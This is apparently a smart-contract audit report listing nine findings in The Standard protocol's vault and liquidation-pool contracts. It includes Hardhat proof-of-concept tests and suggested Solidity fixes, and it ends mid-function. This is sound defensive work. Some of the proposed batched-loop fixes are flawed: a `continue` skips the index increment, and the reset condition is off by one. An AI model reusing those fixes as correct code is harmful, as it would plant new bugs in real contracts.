# 1 SmartVaultV3::canRemoveCollateral()

## Title: Wrong calculation in "canRemoveCollateral" prevents user from removing the maximum allowed collateral

## Severity: MEDIUM

##LINK: https://github.com/Cyfrin/2023-12-the-standard/blob/91132936cb09ef9bf82f38ab1106346e2ad60f91/contracts/SmartVaultV3.sol#L12

## Summary
Due to a logic error in the canRemoveCollateral() function, the user cannot retrieve the maximum allowed collateral that corresponds with his borrowed amount of EUROs.

## Vulnerability Details
For a small borrowed amount, the user is forced to keep a fairly large amount of collateral. In the test scenario below, we can see that the collateral rate (which should be a factor of 1.2) goes up to a factor of 45.7

**Let's take a simple example:**

* We provide 1 ETH of collateral
* We borrow 100 EUROs (mint function)
* We burn 95 EUROs (burn function)

At this stage, the minted amount = 100 EUROs - 95 EUROs + 0.5 EUROs (fee) = 5.5 EUROs
The collateral rate used in the unit tests is a factor of 1.2
This means, the minimum required collateral needs to be: 5.5 * 1.2 = 6.6 EUROs
In our test file, we use: 1ETH = 1509.43 EUROs => 6.6 EUROs = 0.00437ETH
So, the minimum collateral required in ETH is 0.00437ETH
This means, we should be able to retrieve up to: 1ETH - 0.00437ETH = 0.995ETH


**The currently used logic forces the following conditions:**

***currentMintable >= eurValueToRemove*** 

currentMintable is 1257.86 EUROs => this means we must leave at least 251.5 EUROs (or 0.1666ETH) as collateral and can retrieve only 1 - 0.1666 = 0.829 ETH

However, we only have a minted amount of 5.5 EUROs => so, this would be a collateral rate of: 251.5 / 5.5 = 45.7 instead of 1.2 !

The second condition is also incorrect: 

***minted <= currentMintable - eurValueToRemove***

5.5 EUROs <= 1257.86 EUROs - eurValueToRemove => eurValueToRemove can be at most: 1257.86 EUROs - 5.5 EUROs = 1252.36 EUROs == 0.829ETH


**To demonstrate the problem with the canRemoveCollateral() function, the following Test/POC can be used:**

1: Add the following test to the smartVault.js file : 

```
it('should allow borrower to remove collateral at the defined collateral rate', async () => {
    //approve for fees
    await EUROs.connect(user).approve(Vault.address, ethers.utils.parseEther('1'))

    //provide collateral, borrow 100 EUROs and burn 95 EUROs afterwards
    await user.sendTransaction({ to: Vault.address, value: ethers.utils.parseEther('1') }) //collat 1ETH
    await Vault.connect(user).mint(user.address, ethers.utils.parseEther('100')) //borrow 100 EUROs
    await Vault.connect(user).burn(ethers.utils.parseEther('95')) //burn 95 EUROs

    //currently minted amount
    const minted = (await Vault.status()).minted //currently minted amount: 100 - 95 + 0.5 (fees) = 5.5 EUROs
    expect(minted).to.equal(ethers.utils.parseEther('5.5'))

    const collateralRequiredForMinted = minted.mul(DEFAULT_COLLATERAL_RATE).div(HUNDRED_PC) // 6.6 EUROs
    console.log(ethers.utils.formatEther(collateralRequiredForMinted))

    //Collateral required for 5.5€ = 5.5 * 1.2 = 6.6€ in ETH
    //1ETH = 1509.43€ => 6.6€ = 0.00437ETH
    //The minimum collateral required is 0.00437ETH
    //This means, we should be able to retrieve up to: 1ETH - 0.00437ETH = 0.995ETH

    await expect(Vault.connect(user).removeCollateralNative(ethers.utils.parseEther('0.996'), user.address)).to.be.revertedWith(
      'err-under-coll'
    )
    await expect(Vault.connect(user).removeCollateralNative(ethers.utils.parseEther('0.995'), user.address)).not.to.be.reverted //PROBLEM : This Fails!!!

    //with the current canRemoveCollateral function, if we try to retrieve 0.83 ETH, the function reverts =>
    //this corresponds with a collateral rate of: 45.7 :
    // await expect(Vault.connect(user).removeCollateralNative(ethers.utils.parseEther('0.83'), user.address)).to.be.revertedWith(
    //   'err-under-coll'
    // )

    //with the current canRemoveCollateral function we can only retrieve up to 0.82 ETH
    //await expect(Vault.connect(user).removeCollateralNative(ethers.utils.parseEther('0.82'), user.address)).not.to.be.reverted
  })
```

## Impact
Depending on the amount of EUROs minted, the user may not be able to remove a sizeable portion of his collateral. Therefore, the protocol does not work as announced and users may be reluctant to use it.

## Tools Used
Manual Review

## Recommendations
Replace the current canRemoveCollateral() function:

```
function canRemoveCollateral(ITokenManager.Token memory _token, uint256 _amount) private view returns (bool) {
      if (minted == 0) return true;
      uint256 currentMintable = maxMintable();
      uint256 eurValueToRemove = calculator.tokenToEurAvg(_token, _amount);
      return currentMintable >= eurValueToRemove &&
          minted <= currentMintable - eurValueToRemove;
  }
```

With the following modified function:

```
function canRemoveCollateral(ITokenManager.Token memory _token, uint256 _amount) private view returns (bool) {
      if (minted == 0) return true;
      uint256 eurValueToRemove = calculator.tokenToEurAvg(_token, _amount);
      uint256 euroCollateral = euroCollateral();

      if (eurValueToRemove >= euroCollateral) return false;

      uint256 collateralEuroLeft = euroCollateral - eurValueToRemove;
      uint256 maxMintableWithCollateraleLeft = (collateralEuroLeft * ISmartVaultManagerV3(manager).HUNDRED_PC()) / ISmartVaultManagerV3(manager).collateralRate();

      return minted <= maxMintableWithCollateraleLeft;
}
```

# 2: SmartVaultV3::swap()  

## Title: calculateMinimumAmountOut() returning 0 can lead to big losses due to slippage

## Severity: MEDIUM

## Link: https://github.com/Cyfrin/2023-12-the-standard/blob/91132936cb09ef9bf82f38ab1106346e2ad60f91/contracts/SmartVaultV3.sol#L211

## Summary

Under certain circumstances, the calculateMinimumAmountOut() function returns 0. This value is then used for the amountOutMinimum parameter for ExactInputSingleParams and can lead to substantial losses due to slippage.

## Vulnerability Details

There is no way for the user to specify a value for the amountOutMinimum parameter. On pools with low liquidity, this poses a substantial risk for the user. Users who are not aware of this problem may use the swap function and potentially suffer big losses and users who are aware of the risk, probably won't use this function at all.

## Impact

Loss on asset swaps due to slippage and bad reputation for the protocol of not being secure.

## Tools Used

Manual Review

## Recommendations

* Allow the user to specify a value for the amountOutMinimum parameter in ExactInputSingleParams. Provide an additional argument for the swap() function, for example: ***minAmountOutUser***.

* This value should then be used in the calculateMinimumAmountOut() function to calculate the correct amount for amountOutMinimum and to avoid having a value of 0 for the case of: ***collateralValueMinusSwapValue >= requiredCollateralValue***

* Add an additional argument to the swap() function, for example: uint256 minAmountOutUser

* Add this argument also to the calculateMinimumAmountOut() function

* Use the argument when calling calculateMinimumAmountOut() in the swap() function

**In calculateMinimumAmountOut(), make the following modifications:**

```
function calculateMinimumAmountOut(bytes32 _inTokenSymbol, bytes32 _outTokenSymbol, uint256 _amount, uint256 _minAmountOutUser) private view returns (uint256) {
    ISmartVaultManagerV3 _manager = ISmartVaultManagerV3(manager);
    uint256 requiredCollateralValue = (minted * _manager.collateralRate()) / _manager.HUNDRED_PC();
    uint256 collateralValueMinusSwapValue = euroCollateral() - calculator.tokenToEur(getToken(_inTokenSymbol), _amount);

    if (collateralValueMinusSwapValue >= requiredCollateralValue) {
        return _minAmountOutUser;
    } else {
        uint256 calculatedMinOut = calculator.eurToToken(getToken(_outTokenSymbol), requiredCollateralValue - collateralValueMinusSwapValue);
        return calculatedMinOut >= _minAmountOutUser ? calculatedMinOut : _minAmountOutUser;
    }
}
```


# 3: SmartVaultV3::setOwner()

## Title: SmartVaultV3::setOwner() single-step process for ownership transfer could result in locking critical functions

## Severity: MEDIUM

## Link: https://github.com/Cyfrin/2023-12-the-standard/blob/91132936cb09ef9bf82f38ab1106346e2ad60f91/contracts/SmartVaultV3.sol#L233

## Summary

Changing the owner address in a single-step process allows the owner to transfer ownership to a non-existent or mistyped address and potentially locks all functions that use the onlyOwner modifier.

## Vulnerability Details

The currently used 1-step process (changing the owner address using the setOwner() function) is risky, because it allows to transfer ownership to a non-existent or mistyped address. .

## Impact

If by accident, the ownership is transferred to the wrong address (zero address mistyped address), key features of the contract become unusable. In our contract, the following functions would no longer be able to be called: removeCollateralNative(),removeCollateral(), removeAsset(), mint() and swap()

## Tools Used

Manual Review

## Recommendations

Instead, a 2-step process should be used to change the owner address. In the first step, the current owner should call a method to transfer the ownership. And, in the second step, the new owner needs to call a method to accept the ownership.

The easiest way to implement this is by using Ownable2Step.sol contract from OpenZeppelin, which provides the transferOwnership(address newOwner) function to initiate the transfer and the function acceptOwnership() that needs to be called by the pending owner in order to accept the ownership of the contract and to finalize the ownership transfer.

The contract can be fund at: https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/access/Ownable2Step.sol



# 4: SmartVaultV3::liquidate()

## Title: SmartVaultV3::liquidate() transfers assets to wrong address and prevents stakers from obtaining liquidation rewards

## Severity: HIGH

## Link: https://github.com/Cyfrin/2023-12-the-standard/blob/91132936cb09ef9bf82f38ab1106346e2ad60f91/contracts/SmartVaultV3.sol#L105

https://github.com/Cyfrin/2023-12-the-standard/blob/91132936cb09ef9bf82f38ab1106346e2ad60f91/contracts/SmartVaultV3.sol#L111


## Summary

The liquidateNative() and liquidateERC20() functions transfer the assets recovered from vault liquidations to the wrong address. Those assets are transferred to the protocol owner address, however, they should be transferred to the Liquidation Pool Manager.

## Vulnerability Details

The liquidateNative() function contains the following code:
```
(bool sent, ) = payable(ISmartVaultManagerV3(manager).protocol()).call{value: address(this).balance}("");
```
And, the liquidateERC20() function contains the following code:
```
if (_token.balanceOf(address(this)) != 0) _token.safeTransfer(ISmartVaultManagerV3(manager).protocol(), _token.balanceOf(address(this)));
```
Both functions transfer assets to the protocol address that is defined in the SmartVaultManagerV3, which is an externally owned account address.

**To get a better understanding of the asset flow from Vault liquidation to asset distribution, let's take a quick look of the core functions (we only care about functions that concern the asset flow):**

1: We start by calling the runLiquidation() function in the Liquidation Pool Manager (LPM)

2: This function calls the liquidateVault() function in the Smart Vault Manager (SVM)

3: This then calls the liquidate() function on the corresponding Smart Vault (SV)

4: This calls the liquidateNative() and liquidateERC20() functions in the SV

5: Those 2 functions transfer assets (native ETH and ERC20 tokens) to the protocol address defined in the SVM using the following lines of code:
```
payable(ISmartVaultManagerV3(manager).protocol()).call{value: address(this).balance}("");

_token.safeTransfer(ISmartVaultManagerV3(manager).protocol(), _token.balanceOf(address(this)));
```
6: At this stage, the liquidated assets have been sent to the protocol address and they won't be accessible during the asset distribution stage.

7: Once the Vault liquidation is finished and some additional code has been executed, the runLiquidation() function in the LPM calls the distributeAssets() function on the LP and transfers the entire ETH balance of the LPM ( ethBalance = address(this).balance;  ) to the LP along with the Assets array that contains the tokens and balances from the Vault liquidation:
```
LiquidationPool(pool).distributeAssets{value: ethBalance}(assets, manager.collateralRate(), manager.HUNDRED_PC());
```
8: The step above assumes, that all assets from the Vault liquidation have been transferred to the LPM, however, they wrongly have been transferred to the protocol address and therefore are not available in the LPM for reward distributions.

9: The distributeAssets() function in the LP iterates over all stakers, calculates corresponding rewards, stores them in the rewards array for each holder and token and finally transfers ERC20  assets from the LPM to the LP using the following lines of code:
```
IERC20(asset.token.addr).safeTransferFrom(manager, address(this), _portion);
```
The above line of code attempts to transfer a specific ERC20 token balance from the manager - which is the LPM that deployed the LP => constructor in LP: manager = payable(msg.sender); - to the LP ( address(this) )

10: As already mentioned, this won't work, because the LPM does not hold those assets (neither native ETH nor ERC20's), instead, they were sent to the protocol address, which is not the LPM contract.

**To demonstrate the described asset distribution problem, the following Test/POC is provided:**

1: Add the following test to the liquidationPool.js file :

```
it('should transfer liquidation assets to the Liquidation Pool Manager', async () => {
    //user1 provides 10 ETH collateral & borrows max EUROs
    await user1.sendTransaction({ to: Vault.address, value: ethers.utils.parseEther('10') })
    const { maxMintable } = await Vault.status()
    const mintingFee = maxMintable.mul(PROTOCOL_FEE_RATE).div(HUNDRED_PC)
    await Vault.connect(user1).mint(user1.address, maxMintable.sub(mintingFee))

    // user2 stakes 1000 TST/EUROs
    const balance = ethers.utils.parseEther('1000')
    await TST.mint(user2.address, balance)
    await EUROs.mint(user2.address, balance)
    await TST.connect(user2).approve(LiquidationPool.address, balance)
    await EUROs.connect(user2).approve(LiquidationPool.address, balance)
    await LiquidationPool.connect(user2).increasePosition(balance, balance)
    await fastForward(DAY)

    //drop ETH price slightly, so user1 will be undercollateralized
    await ClEthUsd.setPrice(BigNumber.from(150000000000))
    expect(await Vault.undercollateralised()).to.equal(true)

    // ************ STATE BEFORE LIQUIDATION

    //balances before vault liquidation
    let user2ETHBalanceBefore = await ethers.provider.getBalance(user2.address)
    const protocolETHBalanceBefore = await ethers.provider.getBalance(Protocol.address)
    const LPMETHBalanceBefore = await ethers.provider.getBalance(LiquidationPoolManager2.address)
    const user2ETHRewardsBefore = (await LiquidationPool.findRewards(user2.address))[0].amount

    expect(user2ETHBalanceBefore).to.be.within(ethers.utils.parseEther('9999'), ethers.utils.parseEther('10000'))
    expect(protocolETHBalanceBefore).to.equal(ethers.utils.parseEther('10000'))
    expect(LPMETHBalanceBefore).to.equal(0)
    expect(user2ETHRewardsBefore).to.equal(0)
    // console.log('User2 ETH balance: ', ethers.utils.formatEther(user2ETHBalanceBefore))
    // console.log('Protocol ETH balance: ', ethers.utils.formatEther(protocolETHBalanceBefore))
    // console.log('LPM ETH balance: ', ethers.utils.formatEther(LPMETHBalanceBefore))
    // console.log('User2 ETH Rewards: ', ethers.utils.formatEther(user2ETHRewardsBefore))

    // ************ LIQUIDATE VAULT

    await VaultManager.connect(user1).setLiquidatorAddress(LiquidationPoolManager2.address)
    await LiquidationPoolManager2.connect(Protocol).runLiquidation(TOKEN_ID)

    //balances before vault liquidation
    let user2ETHBalanceAfter = await ethers.provider.getBalance(user2.address)
    const protocolETHBalanceAfter = await ethers.provider.getBalance(Protocol.address)
    const LPMETHBalanceAfter = await ethers.provider.getBalance(LiquidationPoolManager2.address)
    const user2ETHRewardsAfter = (await LiquidationPool.findRewards(user2.address))[0].amount

    expect(user2ETHBalanceAfter).to.be.within(ethers.utils.parseEther('9999'), ethers.utils.parseEther('10000'))
    //expect(protocolETHBalanceAfter).to.equal(ethers.utils.parseEther('10000')) // PROBLEM! this is now ~10010
    //expect(LPMETHBalanceAfter).to.equal(ethers.utils.parseEther('10')) // PROBLEM! this is still 0, but should be 10
    //expect(user2ETHRewardsAfter).to.equal(ethers.utils.parseEther('10')) // PROBLEM! this is still 0, but should be 10
    console.log('User ETH balance: ', ethers.utils.formatEther(user2ETHBalanceAfter))
    console.log('Protocol ETH balance: ', ethers.utils.formatEther(protocolETHBalanceAfter))
    console.log('LPM ETH balance: ', ethers.utils.formatEther(LPMETHBalanceAfter))
    console.log('User2 ETH Rewards: ', ethers.utils.formatEther(user2ETHRewardsAfter))

    // ************ CLAIM REWARDS

    user2ETHBalanceBefore = await ethers.provider.getBalance(user2.address)
    expect(user2ETHBalanceBefore).to.be.within(ethers.utils.parseEther('9999'), ethers.utils.parseEther('10000'))
    console.log('User ETH balance: ', ethers.utils.formatEther(user2ETHBalanceBefore))

    await LiquidationPool.connect(user2).claimRewards()

    user2ETHBalanceAfter = await ethers.provider.getBalance(user2.address)
    //expect(user2ETHBalanceAfter).to.be.within(ethers.utils.parseEther('10000'), ethers.utils.parseEther('10010')) // PROBLEM! this is still ~10000, but should be ~10010
    console.log('User ETH balance: ', ethers.utils.formatEther(user2ETHBalanceAfter))
})
```

2: Update the **_const {  mockTokenManager,.. } = require('./common')_** code section and add the following variables:

```
DEFAULT_ETH_USD_PRICE,   PROTOCOL_FEE_RATE,   ETH,   getNFTMetadataContract,   fullyUpgradedSmartVaultManager, HUNDRED_PC
```

3: Update the **_let user1, user2..._** code section and add the following variables:

```
LiquidationPoolManager2, LiquidationPool2, VaultManager, Vault, TokenManager1, ClEthUsd, SwapRouterMock, MockWeth
```

4: Add the following code at the end of the **_beforeEach(async () => {..._** code block:

```
ClEthUsd = await (await ethers.getContractFactory('ChainlinkMock')).deploy('ETH / USD')
await ClEthUsd.setPrice(DEFAULT_ETH_USD_PRICE)
const ClEurUsd = await (await ethers.getContractFactory('ChainlinkMock')).deploy('EUR / USD')
await ClEurUsd.setPrice(DEFAULT_EUR_USD_PRICE)
TokenManager1 = await (await ethers.getContractFactory('TokenManagerMock')).deploy(ETH, ClEthUsd.address)
const SmartVaultDeployer = await (await ethers.getContractFactory('SmartVaultDeployerV3')).deploy(ETH, ClEurUsd.address)
const SmartVaultIndex = await (await ethers.getContractFactory('SmartVaultIndex')).deploy()
const NFTMetadataGenerator = await (await getNFTMetadataContract()).deploy()
SwapRouterMock = await (await ethers.getContractFactory('SwapRouterMock')).deploy()
MockWeth = await (await ethers.getContractFactory('WETHMock')).deploy()

VaultManager = await fullyUpgradedSmartVaultManager(
  DEFAULT_COLLATERAL_RATE,
  PROTOCOL_FEE_RATE,
  EUROs.address,
  Protocol.address,
  Protocol.address,
  TokenManager1.address,
  SmartVaultDeployer.address,
  SmartVaultIndex.address,
  NFTMetadataGenerator.address,
  MockWeth.address,
  SwapRouterMock.address
)

await SmartVaultIndex.setVaultManager(VaultManager.address)
await EUROs.grantRole(await EUROs.DEFAULT_ADMIN_ROLE(), VaultManager.address)
await VaultManager.connect(user1).mint() //user creates a vault

const { status } = (await VaultManager.connect(user1).vaults())[0]
const { vaultAddress } = status
Vault = await ethers.getContractAt('SmartVaultV3', vaultAddress) //address of newly created vault

LiquidationPoolManager2 = await (
  await ethers.getContractFactory('LiquidationPoolManager')
).deploy(TST.address, EUROs.address, VaultManager.address, EurUsd.address, Protocol.address, POOL_FEE_PERCENTAGE)

LiquidationPool2 = await ethers.getContractAt('LiquidationPool', await LiquidationPoolManager2.pool())
await EUROs.grantRole(await EUROs.BURNER_ROLE(), LiquidationPool2.address)
```

## Impact

Liquidation assets are not transferred to the Liquidation Pool Manger when a Vault is liquidated, instead, they are transferred to the "protocol" externally owned account. Therefore, stakers are not able to claim any liquidation rewards.

## Tools Used

Manual Review

## Recommendations

Add an immutable state variable to the **SmartVaultV3** contract and set it to the address of the **Liquidation Pool Manager** during Vault deployment:

```
address private immutable liquidationPoolManager;
...

constructor(bytes32 _native, address _manager, address _owner, address _euros, address _priceCalculator, address _liquidationPoolManager) {
       liquidationPoolManager = _liquidationPoolManager;
	  ...

```

In the **liquidateNative() and liquidateERC20()** functions transfer the assets recovered from vault liquidations to the liquidationPoolManager address

In the liquidateNative() function, replace the current transfer code with the following code:

```
(bool sent, ) = payable(liquidationPoolManager).call{value: address(this).balance}("");

```

And, in the liquidateERC20() function replace the current transfer code with the following code:

```
if (_token.balanceOf(address(this)) != 0) _token.safeTransfer(liquidationPoolManager, _token.balanceOf(address(this)));

```


# 5: LiquidationPool => distributeFees() : loop => out of gas - unbounded loop

## Title: LiquidationPool::distributeFees() can cause gas grieving due to unbounded loop

## Severity: HIGH

## Link: https://github.com/Cyfrin/2023-12-the-standard/blob/91132936cb09ef9bf82f38ab1106346e2ad60f91/contracts/LiquidationPool.sol#L186

## Summary

When the number of holders exceeds a certain limit, the iteration over the holders array will cause an out of gas exception and block the entire protocol.

In order to distribute fees to all eligible stakers, the iteration over the holders array should be batched over several iterations if a specified gas limit is exceeded.

## Vulnerability Details

Unbounded loops are loops without a defined endpoint, meaning they can theoretically run indefinitely. In Solidity smart contracts, these loops can be particularly problematic, as they consume an unpredictable amount of gas. At a certain stage, the block.gasLimit will be reached, the transaction will fail and the entire protocol is at risk of becoming unusable. 

Therefore, if necessary, the distributeFees() function call should be batched over several transactions. Whenever a specific gas limit is reached, the current transaction should be finalized and a new function call should be required to continue the loop over the holders array. 

The example below shows how this can be achieved.

## Impact

When the number of holders exceeds a certain limit, the iteration over the holders array will cause an out of gas exception and block the entire protocol.

## Tools Used

Manual Review

## Recommendations  

Batch the distributeFees() function call over several transactions if a specific gas limit is exceeded.

The following code could be used for the distributeFees() function:

```
uint256 public nextHolderIndexForFees;
bool public continueFeeDistribution;
uint256 private constant MIN_GAS_AMOUNT = 200000;

function distributeFeesNew(uint256 _amount) external onlyManager {
    uint256 tstTotal = getTstTotal(); //total stake of TST + pending

    if (tstTotal > 0) {
        IERC20(EUROs).safeTransferFrom(msg.sender, address(this), _amount);

        continueFeeDistribution = true;
        uint256 i = nextHolderIndexForFees;
        while (i < holders.length && gasleft() > MIN_GAS_AMOUNT) {
            address _holder = holders[i];
            if (positions[_holder].holder == address(0)) continue;
            positions[_holder].EUROs += (_amount * positions[_holder].TST) / tstTotal;
            positions[_holder].pendingEUROs += (_amount * positions[_holder].pendingTST) / tstTotal;
            i++;
        }

        nextHolderIndexForFees = i;
        if (i == holders.length - 1) {
            continueFeeDistribution = false;
            nextHolderIndexForFees = 0;
        }
    }
}
```

nextHolderIndexForFees: state variable to hold the current holder index

MIN_GAS_AMOUNT: a constant that holds the minimum amount of gas that needs to be available in order to continue the loop iteration.  

continueFeeDistribution: a Boolean that indicates if a specific fee distribution event has been finished or if we need to keep calling the distributeFees() function in order to distribute fees to all stakers.


# 6: LiquidationPool => distributeAssets() : loop => out of gas - unbounded loop

## Title: LiquidationPool::distributeAssets() can cause gas grieving due to unbounded loop

## Severity: HIGH

## Link: https://github.com/Cyfrin/2023-12-the-standard/blob/91132936cb09ef9bf82f38ab1106346e2ad60f91/contracts/LiquidationPool.sol#L211

## Summary

When the number of holders exceeds a certain limit, the iteration over the holders array will cause an out of gas exception and block the entire protocol.

In order to distribute assets to all eligible stakers, the iteration over the holders array should be batched over several iterations if a specified gas limit is exceeded.

## Vulnerability Details

Unbounded loops are loops without a defined endpoint, meaning they can theoretically run indefinitely. In Solidity smart contracts, these loops can be particularly problematic, as they consume an unpredictable amount of gas. At a certain stage, the block.gasLimit will be reached, the transaction will fail and the entire protocol is at risk of becoming unusable. 

Therefore, if necessary, the distributeAssets() function call should be batched over several transactions. Whenever a specific gas limit is reached, the current transaction should be finalized and a new function call should be required to continue the loop over the holders array. 

The example below shows how this can be achieved.

## Impact

When the number of holders exceeds a certain limit, the iteration over the holders array will cause an out of gas exception and block the entire protocol.

## Tools Used

Manual Review

## Recommendations

Batch the distributeAssets() function call over several transactions if a specific gas limit is exceeded.

**The following code can be used for the distributeAssets() function:**

```
uint256 public nextHolderIndexForAssets;
bool public continueAssetDistribution;

function distributeAssets(ILiquidationPoolManager.Asset[] memory _assets, uint256 _collateralRate, uint256 _hundredPC) external payable onlyManager {
    consolidatePendingStakes();
    (, int256 priceEurUsd, , , ) = Chainlink.AggregatorV3Interface(eurUsd).latestRoundData();
    uint256 stakeTotal = getStakeTotal();
    uint256 burnEuros;
    uint256 nativePurchased;

    continueAssetDistribution = true;
    uint256 j = nextHolderIndexForAssets;
    while (j < holders.length && gasleft() > MIN_GAS_AMOUNT) {
        Position memory _position = positions[holders[j]];
        uint256 _positionStake = stake(_position);
        if (_positionStake > 0) {
            for (uint256 i = 0; i < _assets.length; i++) {
                ILiquidationPoolManager.Asset memory asset = _assets[i];
                if (asset.amount > 0) {
                    (, int256 assetPriceUsd, , , ) = Chainlink.AggregatorV3Interface(asset.token.clAddr).latestRoundData();
                    uint256 _portion = (asset.amount * _positionStake) / stakeTotal;
                    uint256 costInEuros = (((_portion * 10 ** (18 - asset.token.dec) * uint256(assetPriceUsd)) / uint256(priceEurUsd)) * _hundredPC) / _collateralRate;
                    if (costInEuros > _position.EUROs) {
                        _portion = (_portion * _position.EUROs) / costInEuros;
                        costInEuros = _position.EUROs;
                    }

                    _position.EUROs -= costInEuros;
                    rewards[abi.encodePacked(_position.holder, asset.token.symbol)] += _portion;
                    burnEuros += costInEuros;
                    if (asset.token.addr == address(0)) {
                        nativePurchased += _portion;
                    } else {
                        IERC20(asset.token.addr).safeTransferFrom(manager, address(this), _portion);
                    }
                }
            }
        }
        positions[holders[j]] = _position;
        j++;
    }

    nextHolderIndexForAssets = j;
    if (j == holders.length - 1) {
        continueAssetDistribution = false;
        nextHolderIndexForAssets = 0;
    }

    if (burnEuros > 0) IEUROs(EUROs).burn(address(this), burnEuros);
    returnUnpurchasedNative(_assets, nativePurchased);
}
```

**nextHolderIndexForAssets:** state variable to hold the current holder index for the asset distribution

**MIN_GAS_AMOUNT:** a constant that holds the minimum amount of gas that needs to be available in order to continue the loop iteration.  

**continueAssetDistribution:** a Boolean that indicates if a specific asset distribution event has been finished or if we need to keep calling the distributeAssets() function in order to distribute assets to all stakers.


# 7: LiquidationPool => holderPendingStakes() : loop => out of gas - unbounded loop

## Title: LiquidationPool::holderPendingStakes() can cause gas grieving due to an unbounded loop and block the entire protocol

## Severity: MEDIUM

## Link: 
https://github.com/Cyfrin/2023-12-the-standard/blob/91132936cb09ef9bf82f38ab1106346e2ad60f91/contracts/LiquidationPool.sol#L29
https://github.com/Cyfrin/2023-12-the-standard/blob/91132936cb09ef9bf82f38ab1106346e2ad60f91/contracts/LiquidationPool.sol#L74

## Summary

When the number of pending stakes exceeds a certain limit, the iteration over the pendingStakes array will cause an out of gas exception and prevent the retrieval of position details for a specific holder.

## Vulnerability Details

Unbounded loops are loops without a defined endpoint, meaning they can theoretically run indefinitely. In Solidity smart contracts, these loops can be particularly problematic, as they consume an unpredictable amount of gas. At a certain stage, the block.gasLimit will be reached, the transaction will fail and the entire protocol is at risk of becoming unusable. 

## Impact

When the number of pending stakes exceeds a certain limit, the iteration over the pendingStakes array will cause an out of gas exception and prevent the retrieval of position details for a specific holder.

## Tools Used

Manual Review

## Recommendations

Don't use arrays for data structures that can't be contained to a limited size (like the Token array in the tokenManager).

The pendingStakes array as well as the PendingStake structure should be deleted and the TST, EUROs and createdAt variables from the PendingStake structure should be added as pendingTST, pendingEUROs and pendingStakeCreatedAt variables to the Position structure, so they can easily be accessed via the positions mapping for a specific user.

Whenever a user opens a new staking position or adds to an existing one, those values (pendingTST, pendingEUROs and pendingStakeCreatedAt) will be updated in the Position struct for the corresponding user.

**Updated Position struct:**

```
struct Position {
    address holder;
    uint256 TST;
    uint256 EUROs;
    uint256 pendingEUROs;
    uint256 pendingTST;
    uint256 pendingStakeCreatedAt;
}
```

Pending stakes can then be consolidated for each individual user on specific actions, like: increasePosition, decreasePosition, distributeFees, distributeAssets... 

After checking the timestamp and the value of pendingStakeCreatedAt, the variables can be updated in the Position structure for the corresponding user if the required amount of time has passed => reset the pendingTST, pendingEUROs and pendingStakeCreatedAt variables and update to the TST and EUROs variables in the Position structure accordingly.


# 8: LiquidationPool => deleteHolder() : loop => out of gas - unbounded loop

## Title: LiquidationPool::deleteHolder() can cause gas grieving due to an unbounded loop and block the entire protocol

## Severity: HIGH

## Link: https://github.com/Cyfrin/2023-12-the-standard/blob/91132936cb09ef9bf82f38ab1106346e2ad60f91/contracts/LiquidationPool.sol#L96

## Summary

When the number of holders exceeds a certain limit, the iteration over the holders array will cause an out of gas exception and block the entire protocol.

## Vulnerability Details

Unbounded loops are loops without a defined endpoint, meaning they can theoretically run indefinitely. In Solidity smart contracts, these loops can be particularly problematic, as they consume an unpredictable amount of gas. At a certain stage, the block.gasLimit will be reached, the transaction will fail and the entire protocol is at risk of becoming unusable. 

## Impact

When the number of holders exceeds a certain limit, the iteration over the holders array will cause an out of gas exception and block the entire protocol.

## Tools Used

Manual Review

## Recommendations

The holders array is only required for the functions distributeFees() and distributeAssets() in order to distribute fees and assets to all eligible stakers. For those 2 functions, the iteration over the holders array should be batched over several iterations if a specified gas limit is exceeded.

Stakers can be added to the holders array in order to perform those fee and asset distributions, but they don't necessarily need to be deleted. So, the deleteHolder() function is not really required. When we iterate over the users in the holders array, we can easily verify the eligibility for fee and asset distribution of each staker by checking the corresponding position in the positions mapping.

Solution:

Delete the deleteHolder() function and the corresponding function call in the deletePosition() function from the contract code and batch the distributeFees() and distributeAssets() function calls over several transactions if a specific gas limit is exceeded.


# 9: LiquidationPool => consolidatePendingStakes() : loop => out of gas - unbounded loop 

## Title: LiquidationPool::consolidatePendingStakes() can cause gas grieving due to an unbounded loop and block the entire protocol

## Severity: HIGH

## Link: 
https://github.com/Cyfrin/2023-12-the-standard/blob/91132936cb09ef9bf82f38ab1106346e2ad60f91/contracts/LiquidationPool.sol#L121

## Summary

When the number of pending stakes exceeds a certain limit, the iteration over the pendingStakes array will cause an out of gas exception and block the entire protocol.

Also, updating the array length in a loop is very risky and should be avoided. In consolidatePendingStakes(), while iterating over the pendingStakes array, the deletePendingStake() function is called to delete a specific element in the pendingStakes array. This kind of practice should always be avoided.

## Vulnerability Details

Unbounded loops are loops without a defined endpoint, meaning they can theoretically run indefinitely. In Solidity smart contracts, these loops can be particularly problematic, as they consume an unpredictable amount of gas. At a certain stage, the block.gasLimit will be reached, the transaction will fail and the entire protocol is at risk of becoming unusable. 

## Impact

When the number of pending stakes exceeds a certain limit, the iteration over the pendingStakes array will cause an out of gas exception and block the entire protocol.

## Tools Used

Manual Review

## Recommendations

* The pendingStakes array as well as the PendingStake structure should be deleted and the TST, EUROs and createdAt variables from the PendingStake structure should be added as pendingTST, pendingEUROs and pendingStakeCreatedAt variables to the Position structure, so they can easily be accessed via the positions mapping for a specific user.

* Whenever a user opens a new staking position or adds to an existing one, those values (pendingTST, pendingEUROs and pendingStakeCreatedAt) will be updated in the Position struct for the corresponding user.

* Pending stakes can then be consolidated for each individual user on specific actions, like: increasePosition, decreasePosition, distributeFees, distributeAssets... 

* After checking the timestamp and the value of pendingStakeCreatedAt, the variables can be updated in the Position structure for the corresponding user if the required amount of time has passed => reset the pendingTST, pendingEUROs and pendingStakeCreatedAt variables and update to the TST and EUROs variables in the Position structure accordingly.

**Replace the existing consolidatePendingStakes() function with the following function:**

```
function consolidatePendingStakesUser(address user) private {
    uint256 deadline = block.timestamp - 1 days;
    Position storage pos = positions[user];
    //verify if the user already has a staking position
    if (pos.holder != address(0)) {
        //the pendingTST, pendingEUROs and pendingStakeCreatedAt fields needs to be added to the Position struct
        if (pos.pendingStakeCreatedAt < deadline) {
            pos.TST += pos.pendingTST;
            pos.EUROs += pos.pendingEUROs;
            pos.pendingTST = 0;
            pos.pendingEUROs = 0;
        }
    }
}
```

And, in all functions that require a pending stake consolidation (increasePosition() and decreasePosition() ), call the new consolidatePendingStakesUser() function.

In the increasePosition() function, instead of adding a new entry to the pendingStakes array, simply update the values for pendingTST, pendingEUROs and pendingStakeCreatedAt in the corresponding positions mapping.

**Here is a modified version of the increasePosition() function:**

```
function increasePosition(uint256 _tstVal, uint256 _eurosVal) external {
